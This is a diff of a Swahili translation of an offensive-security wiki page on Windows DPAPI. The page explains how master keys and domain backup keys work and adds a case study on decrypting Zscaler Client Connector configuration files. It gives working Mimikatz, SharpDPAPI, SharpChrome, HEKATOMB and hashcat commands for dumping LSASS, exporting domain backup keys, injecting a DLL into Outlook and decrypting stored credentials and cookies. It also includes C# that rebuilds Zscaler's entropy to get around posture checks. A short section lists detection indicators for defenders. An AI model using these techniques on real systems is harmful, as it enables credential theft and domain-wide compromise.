@@ -6,31 +6,31 @@
 
 ## DPAPI ni Nini
 
-Data Protection API (DPAPI) inatumika hasa ndani ya mfumo wa uendeshaji wa Windows kwa **symmetric encryption ya funguo za binafsi zisizo sawa**, ikitumia siri za mtumiaji au mfumo kama chanzo muhimu cha entropy. Njia hii inarahisisha usimbaji kwa waendelezaji kwa kuwapa uwezo wa kusimbia data kwa kutumia funguo zinazotokana na siri za kuingia za mtumiaji au, kwa usimbaji wa mfumo, siri za uthibitishaji wa kikoa cha mfumo, hivyo kuondoa hitaji kwa waendelezaji kusimamia ulinzi wa funguo za usimbaji wenyewe.
+Data Protection API (DPAPI) inatumika hasa ndani ya mfumo wa uendeshaji wa Windows kwa ajili ya **symmetric encryption ya funguo za kibinafsi zisizo za kawaida**, ikitumia siri za mtumiaji au mfumo kama chanzo muhimu cha entropy. Njia hii inarahisisha encryption kwa waendelezaji kwa kuwapa uwezo wa kuandika data kwa kutumia funguo zinazotokana na siri za kuingia za mtumiaji au, kwa ajili ya encryption ya mfumo, siri za uthibitishaji wa kikoa cha mfumo, hivyo kuondoa hitaji kwa waendelezaji kusimamia ulinzi wa funguo za encryption wenyewe.
 
-Njia ya kawaida zaidi ya kutumia DPAPI ni kupitia **`CryptProtectData` na `CryptUnprotectData`** kazi, ambazo zinawawezesha programu kusimbia na kufungua data kwa usalama na kikao cha mchakato ambacho kwa sasa kimeingia. Hii ina maana kwamba data iliyosimbwa inaweza kufunguliwa tu na mtumiaji au mfumo yule yule aliyeisimbia.
+Njia ya kawaida zaidi ya kutumia DPAPI ni kupitia **`CryptProtectData` na `CryptUnprotectData`** kazi, ambazo zinawawezesha programu kuandika na kufungua data kwa usalama na kikao cha mchakato ambacho kwa sasa kimeingia. Hii ina maana kwamba data iliyosimbwa inaweza kufunguliwa tu na mtumiaji au mfumo yule yule aliyeisimbua.
 
-Zaidi ya hayo, kazi hizi pia zinakubali **`entropy` parameter** ambayo pia itatumika wakati wa usimbaji na ufunguzi, hivyo, ili kufungua kitu kilichosimbwa kwa kutumia parameter hii, lazima utoe thamani sawa ya entropy ambayo ilitumika wakati wa usimbaji.
+Zaidi ya hayo, kazi hizi pia zinakubali **`entropy` parameter** ambayo pia itatumika wakati wa encryption na decryption, hivyo, ili kufungua kitu kilichosimbwa kwa kutumia parameter hii, lazima utoe thamani sawa ya entropy ambayo ilitumika wakati wa encryption.
 
 ### Uundaji wa funguo za Watumiaji
 
-DPAPI inaunda funguo maalum (inayoitwa **`pre-key`**) kwa kila mtumiaji kulingana na akidi zao. Funguo hii inatokana na nywila ya mtumiaji na mambo mengine na algorithimu inategemea aina ya mtumiaji lakini inamalizika kuwa SHA1. Kwa mfano, kwa watumiaji wa kikoa, **inategemea HTLM hash ya mtumiaji**.
+DPAPI inaunda funguo ya kipekee (inayoitwa **`pre-key`**) kwa kila mtumiaji kulingana na akidi zao. Funguo hii inatokana na nywila ya mtumiaji na mambo mengine na algorithimu inategemea aina ya mtumiaji lakini inamalizika kuwa SHA1. Kwa mfano, kwa watumiaji wa kikoa, **inategemea HTLM hash ya mtumiaji**.
 
 Hii ni ya kuvutia hasa kwa sababu ikiwa mshambuliaji anaweza kupata hash ya nywila ya mtumiaji, wanaweza:
 
 - **Kufungua data yoyote iliyosimbwa kwa kutumia DPAPI** kwa funguo ya mtumiaji huyo bila kuhitaji kuwasiliana na API yoyote
 - Jaribu **kufungua nywila** bila mtandaoni wakijaribu kuunda funguo halali ya DPAPI
 
-Zaidi ya hayo, kila wakati data fulani inaposimbwa na mtumiaji kwa kutumia DPAPI, funguo mpya ya **master key** inaundwa. Funguo hii ya master ndiyo inayotumika kweli kusimbia data. Kila funguo ya master inatolewa na **GUID** (Globally Unique Identifier) inayoiainisha.
+Zaidi ya hayo, kila wakati data fulani inaposimbwa na mtumiaji kwa kutumia DPAPI, funguo mpya ya **master key** inaundwa. Funguo hii ya master ndiyo inayotumika kwa kweli kuandika data. Kila funguo ya master inatolewa na **GUID** (Globally Unique Identifier) inayoiainisha.
 
-Funguo za master zinahifadhiwa katika **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory, ambapo `{SID}` ni Kitambulisho cha Usalama wa mtumiaji huyo. Funguo ya master inahifadhiwa ikiwa imefungwa na **`pre-key`** ya mtumiaji na pia na **funguo ya akiba ya kikoa** kwa ajili ya urejeleaji (hivyo funguo hiyo hiyo inahifadhiwa ikiwa imefungwa mara 2 kwa nywila 2 tofauti).
+Funguo za master zinahifadhiwa katika **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory, ambapo `{SID}` ni Kitambulisho cha Usalama cha mtumiaji huyo. Funguo ya master inahifadhiwa ikiwa imeandikwa kwa siri na **`pre-key`** ya mtumiaji na pia na **funguo ya akiba ya kikoa** kwa ajili ya urejeleaji (hivyo funguo hiyo hiyo inahifadhiwa ikiwa imeandikwa kwa siri mara 2 na nywila 2 tofauti).
 
-Kumbuka kwamba **funguo ya kikoa inayotumika kusimbia funguo ya master iko kwenye wasimamizi wa kikoa na haitabadilika kamwe**, hivyo ikiwa mshambuliaji ana ufikiaji wa msimamizi wa kikoa, wanaweza kupata funguo ya akiba ya kikoa na kufungua funguo za master za watumiaji wote katika kikoa.
+Kumbuka kwamba **funguo ya kikoa inayotumika kuandika funguo ya master iko kwenye wasimamizi wa kikoa na haitabadilika kamwe**, hivyo ikiwa mshambuliaji ana ufikiaji wa msimamizi wa kikoa, wanaweza kupata funguo ya akiba ya kikoa na kufungua funguo za master za watumiaji wote katika kikoa.
 
-Blobs zilizofungwa zina **GUID ya funguo ya master** ambayo ilitumika kusimbia data ndani ya vichwa vyake.
+Blobs zilizofichwa zina **GUID ya funguo ya master** ambayo ilitumika kuandika data ndani ya vichwa vyake.
 
 > [!TIP]
-> Blobs zilizofungwa za DPAPI huanza na **`01 00 00 00`**
+> Blobs zilizofichwa za DPAPI huanza na **`01 00 00 00`**
 
 Pata funguo za master:
 ```bash
@@ -47,7 +47,7 @@ Hii ndiyo inavyoonekana kwa funguo nyingi za Mwalimu wa mtumiaji:
 
 ### Uundaji wa funguo za Mashine/System
 
-Hii ni funguo inayotumika kwa mashine kuandika data. Inategemea **DPAPI_SYSTEM LSA secret**, ambayo ni funguo maalum ambayo ni ya mtumiaji wa SYSTEM pekee. Funguo hii inatumika kuandika data ambayo inahitaji kupatikana na mfumo wenyewe, kama vile akreditif za kiwango cha mashine au siri za mfumo mzima.
+Hii ni funguo inayotumika kwa mashine kuandika data. Inategemea **DPAPI_SYSTEM LSA secret**, ambayo ni funguo maalum ambayo ni lazima mtumiaji wa SYSTEM aweze kuipata. Funguo hii inatumika kuandika data ambayo inahitaji kupatikana na mfumo wenyewe, kama vile akreditivu za kiwango cha mashine au siri za mfumo mzima.
 
 Kumbuka kwamba funguo hizi **hazina nakala ya eneo** hivyo zinapatikana tu kwa ndani:
 
@@ -63,7 +63,7 @@ Kati ya data binafsi iliyo hifadhiwa na DPAPI ni:
 - Nywila za barua pepe na akaunti za FTP za ndani kwa programu kama Outlook na Windows Mail
 - Nywila za folda za pamoja, rasilimali, mitandao isiyo na waya, na Windows Vault, ikiwa ni pamoja na funguo za usimbaji
 - Nywila za muunganisho wa desktop ya mbali, .NET Passport, na funguo za kibinafsi kwa madhumuni mbalimbali ya usimbaji na uthibitishaji
-- Nywila za mtandao zinazodhibitiwa na Meneja wa Akreditif na data binafsi katika programu zinazotumia CryptProtectData, kama Skype, MSN messenger, na zaidi
+- Nywila za mtandao zinazodhibitiwa na Meneja wa Akreditivu na data binafsi katika programu zinazotumia CryptProtectData, kama Skype, MSN messenger, na zaidi
 - Blobs zilizohifadhiwa ndani ya rejista
 - ...
 
@@ -74,7 +74,7 @@ Data iliyo hifadhiwa na mfumo inajumuisha:
 
 ### Chaguzi za kutoa funguo za Mwalimu
 
-- Ikiwa mtumiaji ana ruhusa za msimamizi wa eneo, wanaweza kupata **funguo ya nakala ya eneo** ili kufungua funguo zote za mwalimu wa mtumiaji katika eneo:
+- Ikiwa mtumiaji ana ruhusa za msimamizi wa eneo, wanaweza kupata **funguo ya nakala ya eneo** ili kufungua funguo zote za Mwalimu wa mtumiaji katika eneo:
 ```bash
 # Mimikatz
 lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
@@ -82,12 +82,12 @@ lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
 # SharpDPAPI
 SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
 ```
-- Kwa kuwa na ruhusa za usimamizi wa ndani, inawezekana **kufikia kumbukumbu ya LSASS** ili kutoa funguo kuu za DPAPI za watumiaji wote waliounganishwa na funguo ya SYSTEM.
+- Kwa ruhusa za usimamizi wa ndani, inawezekana **kufikia kumbukumbu ya LSASS** ili kutoa funguo kuu za DPAPI za watumiaji wote waliounganishwa na funguo ya SYSTEM.
 ```bash
 # Mimikatz
 mimikatz sekurlsa::dpapi
 ```
-- Ikiwa mtumiaji ana haki za usimamizi wa ndani, wanaweza kufikia **DPAPI_SYSTEM LSA siri** ili kufungua funguo kuu za mashine:
+- Ikiwa mtumiaji ana mamlaka ya usimamizi wa ndani, wanaweza kufikia **DPAPI_SYSTEM LSA secret** ili kufungua funguo kuu za mashine:
 ```bash
 # Mimikatz
 lsadump::secrets /system:DPAPI_SYSTEM /export
@@ -182,7 +182,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-Chombo cha **SharpDPAPI** pia kinaunga mkono hoja hizi za ufichuzi wa masterkey (zingatia jinsi inavyowezekana kutumia `/rpc` kupata funguo za akiba za maeneo, `/password` kutumia nenosiri la maandiko, au `/pvk` kubainisha faili ya funguo binafsi ya DPAPI ya eneo...):
+Chombo cha **SharpDPAPI** pia kinaunga mkono hoja hizi za ufunguo mkuu (zingatia jinsi inavyowezekana kutumia `/rpc` kupata funguo ya akiba ya maeneo, `/password` kutumia nenosiri la maandiko, au `/pvk` kubainisha faili ya funguo binafsi ya eneo la DPAPI...):
 ```
 /target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
 /pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
@@ -221,7 +221,7 @@ Targeting:
 Note: must use with /pvk:KEY or /password:X
 Note: not applicable to 'blob' or 'ps' commands
 ```
-- Fichua baadhi ya data kwa kutumia **kipindi cha mtumiaji wa sasa**:
+- Fanya ufichuzi wa data fulani ukitumia **sehemu ya mtumiaji wa sasa**:
 ```bash
 # Mimikatz
 dpapi::blob /in:C:\path\to\encrypted\file /unprotect
@@ -232,9 +232,9 @@ SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
 ---
 ### Kushughulikia Entropy ya Hiari ("Third-party entropy")
 
-Baadhi ya programu hupitisha thamani ya ziada ya **entropy** kwa `CryptProtectData`. Bila thamani hii, blob haiwezi kufichuliwa, hata kama funguo kuu sahihi inajulikana. Kupata entropy ni muhimu wakati wa kulenga akidi zilizolindwa kwa njia hii (kwa mfano, Microsoft Outlook, baadhi ya wateja wa VPN).
+Baadhi ya programu hupitisha thamani ya ziada ya **entropy** kwa `CryptProtectData`. Bila thamani hii, blob haiwezi kufichuliwa, hata kama masterkey sahihi inajulikana. Kupata entropy ni muhimu wakati wa kulenga akidi zilizolindwa kwa njia hii (kwa mfano, Microsoft Outlook, baadhi ya wateja wa VPN).
 
-[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ni DLL ya hali ya mtumiaji inayounganisha kazi za DPAPI ndani ya mchakato wa lengo na kwa uwazi inarekodi entropy yoyote ya hiari inayotolewa. Kuendesha EntropyCapture katika hali ya **DLL-injection** dhidi ya michakato kama `outlook.exe` au `vpnclient.exe` kutatoa faili inayounganisha kila buffer ya entropy na mchakato unaoitisha na blob. Entropy iliyorekodiwa inaweza baadaye kutolewa kwa **SharpDPAPI** (`/entropy:`) au **Mimikatz** (`/entropy:<file>`) ili kufichua data.
+[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ni DLL ya hali ya mtumiaji inayounganisha kazi za DPAPI ndani ya mchakato wa lengo na kurekodi kwa uwazi entropy yoyote ya hiari inayotolewa. Kuendesha EntropyCapture katika hali ya **DLL-injection** dhidi ya michakato kama `outlook.exe` au `vpnclient.exe` kutatoa faili inayounganisha kila buffer ya entropy na mchakato wa kuita na blob. Entropy iliyorekodiwa inaweza baadaye kutolewa kwa **SharpDPAPI** (`/entropy:`) au **Mimikatz** (`/entropy:<file>`) ili kufichua data.
 ```powershell
 # Inject EntropyCapture into the current user's Outlook
 InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll
@@ -252,12 +252,11 @@ Microsoft ilianzisha muundo wa **context 3** masterkey kuanzia Windows 10 v1607 
 DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
 hashcat -m 22102 bob.hc wordlist.txt -O -w4
 ```
-Chombo kinaweza pia kuchambua Credential na Vault blobs, kuzikatisha na funguo zilizovunjwa na kusafirisha nywila za wazi.
-
+Chombo kinaweza pia kuchambua Credential na Vault blobs, kuzikatisha kwa funguo zilizovunjwa na kuhamasisha nywila za wazi.
 
 ### Pata data za mashine nyingine
 
-Katika **SharpDPAPI na SharpChrome** unaweza kuashiria chaguo la **`/server:HOST`** ili kupata data za mashine ya mbali. Bila shaka unahitaji kuwa na uwezo wa kufikia mashine hiyo na katika mfano ufuatao inatarajiwa kuwa **funguo ya usimbaji ya akiba ya kikoa inajulikana**:
+Katika **SharpDPAPI na SharpChrome** unaweza kuashiria chaguo la **`/server:HOST`** ili kupata data za mashine ya mbali. Kwa kweli unahitaji kuwa na uwezo wa kufikia mashine hiyo na katika mfano ufuatao inatarajiwa kuwa **funguo ya usimbaji ya akiba ya kikoa inajulikana**:
 ```bash
 SharpDPAPI.exe triage /server:HOST /pvk:BASE64
 SharpChrome cookies /server:HOST /pvk:BASE64
@@ -266,7 +265,7 @@ SharpChrome cookies /server:HOST /pvk:BASE64
 
 ### HEKATOMB
 
-[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ni chombo kinachotumia otomatiki kutoa watumiaji wote na kompyuta kutoka kwenye directory ya LDAP na kutoa funguo za akiba za kudhibiti eneo kupitia RPC. Skripti itatatua anwani za IP za kompyuta zote na kufanya smbclient kwenye kompyuta zote ili kupata DPAPI blobs za watumiaji wote na kufungua kila kitu kwa kutumia funguo za akiba za eneo.
+[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ni chombo kinachotumia otomatiki kutoa watumiaji wote na kompyuta kutoka kwenye directory ya LDAP na kutoa funguo za akiba za mchakato wa kudhibiti kupitia RPC. Skripti itatatua anwani za IP za kompyuta zote na kufanya smbclient kwenye kompyuta zote ili kupata DPAPI blobs za watumiaji wote na kufungua kila kitu kwa kutumia funguo za akiba za domain.
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
@@ -277,9 +276,9 @@ Kwa orodha ya kompyuta zilizopatikana kutoka LDAP unaweza kupata kila sub networ
 [**DonPAPI**](https://github.com/login-securite/DonPAPI) inaweza kutoa siri zilizolindwa na DPAPI kiotomatiki. Toleo la 2.x limeanzisha:
 
 * Kukusanya blobs kwa wakati mmoja kutoka kwa majeshi mamia
-* Kuchambua **context 3** masterkeys na kuunganisha kiotomatiki Hashcat cracking
-* Msaada kwa ajili ya vidakuzi vilivyofichwa "App-Bound" vya Chrome (angalia sehemu inayofuata)
-* Hali mpya ya **`--snapshot`** ya kuangalia mara kwa mara mwisho na kulinganisha blobs mpya zilizoundwa
+* Kuchambua **context 3** masterkeys na kuunganisha kiotomatiki Hashcat
+* Msaada kwa ajili ya vidakuzi vya Chrome "App-Bound" vilivyofichwa (angalia sehemu inayofuata)
+* Hali mpya ya **`--snapshot`** ya kuangalia mara kwa mara maeneo na kutofautisha blobs mpya zilizoundwa
 
 ### DPAPISnoop
 
@@ -288,18 +287,54 @@ Kwa orodha ya kompyuta zilizopatikana kutoka LDAP unaweza kupata kila sub networ
 ## Common detections
 
 - Ufikiaji wa faili katika `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` na directories nyingine zinazohusiana na DPAPI.
-- Haswa kutoka kwenye share ya mtandao kama **C$** au **ADMIN$**.
-- Matumizi ya **Mimikatz**, **SharpDPAPI** au zana zinazofanana kupata kumbukumbu ya LSASS au kutoa masterkeys.
-- Tukio **4662**: *Operesheni ilifanyika kwenye kitu* – inaweza kuhusishwa na ufikiaji wa **`BCKUPKEY`** kitu.
+- Haswa kutoka kwenye sehemu ya mtandao kama **C$** au **ADMIN$**.
+- Matumizi ya **Mimikatz**, **SharpDPAPI** au zana zinazofanana kufikia kumbukumbu ya LSASS au kutoa masterkeys.
+- Tukio **4662**: *Operesheni ilifanyika kwenye kitu* – inaweza kuhusishwa na ufikiaji wa kitu **`BCKUPKEY`**.
 - Tukio **4673/4674** wakati mchakato unapoomba *SeTrustedCredManAccessPrivilege* (Credential Manager)
 
 ---
 ### 2023-2025 vulnerabilities & ecosystem changes
 
-* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Novemba 2023). Mshambuliaji mwenye ufikiaji wa mtandao anaweza kumdanganya mwanachama wa eneo ili kupata funguo ya akiba ya DPAPI yenye uharibifu, kuruhusu ufichuzi wa masterkeys za watumiaji. Imefanyiwa marekebisho katika sasisho la jumla la Novemba 2023 – wasimamizi wanapaswa kuhakikisha DCs na vituo vya kazi vimefanyiwa marekebisho kikamilifu.
-* **Chrome 127 “App-Bound” cookie encryption** (Julai 2024) ilibadilisha ulinzi wa zamani wa DPAPI pekee kwa funguo ya ziada iliyohifadhiwa chini ya **Credential Manager** ya mtumiaji. Ufichuzi wa vidakuzi bila mtandao sasa unahitaji masterkey ya DPAPI na **funguo ya GCM-wrapped app-bound**. SharpChrome v2.3 na DonPAPI 2.x zinaweza kurejesha funguo ya ziada wakati zinapofanya kazi na muktadha wa mtumiaji.
+* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Novemba 2023). Mshambuliaji mwenye ufikiaji wa mtandao anaweza kumdanganya mwanachama wa domain ili kupata funguo ya akiba ya DPAPI yenye uharibifu, ikiruhusu ufichuzi wa masterkeys za watumiaji. Imefanyiwa marekebisho katika sasisho la jumla la Novemba 2023 – wasimamizi wanapaswa kuhakikisha DCs na vituo vya kazi vimefanyiwa marekebisho kikamilifu.
+* **Chrome 127 “App-Bound” cookie encryption** (Julai 2024) ilibadilisha ulinzi wa zamani wa DPAPI pekee kwa funguo ya ziada iliyohifadhiwa chini ya **Credential Manager** ya mtumiaji. Ufichuzi wa vidakuzi bila mtandao sasa unahitaji masterkey ya DPAPI na **funguo ya GCM-wrapped app-bound**. SharpChrome v2.3 na DonPAPI 2.x zinaweza kurejesha funguo ya ziada wakati zinapotekelezwa kwa muktadha wa mtumiaji.
+
+### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID
+
+Zscaler Client Connector inahifadhi faili kadhaa za usanidi chini ya `C:\ProgramData\Zscaler` (mfano `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Kila faili imefichwa kwa **DPAPI (Machine scope)** lakini muuzaji anatoa **custom entropy** ambayo *inasanifishwa wakati wa utendaji* badala ya kuhifadhiwa kwenye diski.
+
+Entropy inajengwa upya kutoka kwa vipengele viwili:
+
+1. Siri iliyowekwa ndani ya `ZSACredentialProvider.dll`.
+2. **SID** ya akaunti ya Windows ambayo usanidi unahusiana nayo.
+
+Algorithimu iliyotekelezwa na DLL ni sawa na:
+```csharp
+byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
+byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);
+
+// XOR the two buffers byte-by-byte
+byte[] tmp = new byte[secret.Length];
+for (int i = 0; i < secret.Length; i++)
+tmp[i] = (byte)(sid[i] ^ secret[i]);
+
+// Split in half and XOR both halves together to create the final entropy buffer
+byte[] entropy = new byte[tmp.Length / 2];
+for (int i = 0; i < entropy.Length; i++)
+entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
+```
+Kwa sababu siri imejumuishwa katika DLL ambayo inaweza kusomwa kutoka kwa diski, **mshambuliaji yeyote wa ndani mwenye haki za SYSTEM anaweza kuunda upya entropy kwa SID yoyote** na kufungua blobs bila mtandao:
+```csharp
+byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
+byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
+Console.WriteLine(Encoding.UTF8.GetString(clear));
+```
+Ufunguo wa habari unatoa usanidi kamili wa JSON, ikiwa ni pamoja na kila **ukaguzi wa mkao wa kifaa** na thamani yake inayotarajiwa - taarifa ambayo ni ya thamani kubwa unapojaribu kupita upande wa mteja.
+
+> TIP: vitu vingine vilivyofichwa (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) vinahifadhiwa kwa DPAPI **bila** entropy (`16` bytes sifuri). Hivyo vinaweza kufunguliwa moja kwa moja kwa `ProtectedData.Unprotect` mara tu haki za SYSTEM zinapatikana.
 
 ## References
+
+- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 
 - [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
 - [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
